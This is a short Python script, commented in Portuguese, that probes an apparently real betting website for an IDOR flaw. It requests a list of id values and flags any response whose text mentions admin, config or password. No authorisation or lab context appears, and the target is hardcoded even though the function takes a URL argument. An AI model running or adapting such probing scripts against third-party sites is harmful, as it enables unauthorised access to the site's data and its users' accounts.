import requests

def test_idor(url):
    print(f"[*] Testando IDOR no parâmetro ID em {url}...")
    
    # Testar IDs baixos (comuns para admin/config) e IDs altos
    test_ids = [1, 2, 3, 0, -1, 999999, 74060665, 74060663]
    
    for tid in test_ids:
        test_url = f"https://w1-panda.bet/?id={tid}"
        try:
            response = requests.get(test_url, timeout=10)
            # Se o conteúdo mudar significativamente ou revelar dados sensíveis
            if "admin" in response.text.lower() or "config" in response.text.lower() or "password" in response.text.lower():
                print(f"[!!!] POSSÍVEL IDOR/VULNERABILIDADE detectada com ID: {tid}")
                print(f"URL: {test_url}")
                return tid
        except:
            pass
            
    print("[-] Nenhuma vulnerabilidade IDOR óbvia detectada via parâmetro ID.")
    return None

if __name__ == "__main__":
    target = "https://w1-panda.bet"
    test_idor(target)
